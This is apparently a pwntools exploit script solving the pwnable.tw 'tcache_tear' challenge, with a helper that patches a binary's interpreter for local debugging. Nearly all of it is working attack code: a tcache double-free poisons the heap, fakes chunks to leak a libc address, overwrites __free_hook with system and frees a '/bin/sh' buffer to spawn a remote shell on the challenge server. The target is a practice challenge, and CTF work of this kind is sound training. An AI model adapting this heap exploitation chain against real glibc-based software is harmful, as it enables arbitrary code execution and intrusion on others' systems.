from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

debug = 0
if debug == 1:
    elf = change_ld('./tcache_tear', './ld-2.26.so')
    p = elf.process(env={'LD_PRELOAD':'./libc-2.26.so'})
    libc = ELF('./libc-2.26.so')
else:
    p = remote('chall.pwnable.tw',10207)
    elf = ELF('./tcache_tear')
    libc = ELF('libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')

def malloc(size, data):
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(data)

def free():
    p.recvuntil('choice :')
    p.sendline('2')

def info():
    p.recvuntil('choice :')
    p.sendline('3')

p.recvuntil('Name:')
p.send('kotori')
#gdb.attach(p)

malloc(0x70, 'kotori')
free()
free()
malloc(0x70, p64(0x602550))
malloc(0x70, 'kotori')
malloc(0x70, p64(0) + p64(0x21) + '\x00' * 0x18 + p64(0x21))

malloc(0x60, 'kotori')
free()
free()
malloc(0x60, p64(0x602050))
malloc(0x60, 'kotori')
malloc(0x60, p64(0) + p64(0x501) + '\x00' * 0x28 + p64(0x602060))
#malloc(0x30, 'A' * 0x28)
#gdb.attach(p)
#info()
free()
p.sendlineafter(":","3")
p.recvuntil("Name :")
libc_addr=u64(p.recv(8))-0x3ebca0
log.info(hex(libc_addr))

#write free_hook
free_hook = libc_addr+libc.symbols['__free_hook']
system_addr = libc_addr+libc.symbols['system']
malloc(0x40,"kotori")
free()
free()
malloc(0x40,p64(free_hook))
malloc(0x40,"kotori")
malloc(0x40,p64(system_addr))

#get_shell
malloc(0x18,"/bin/sh\x00")
free()

p.interactive()
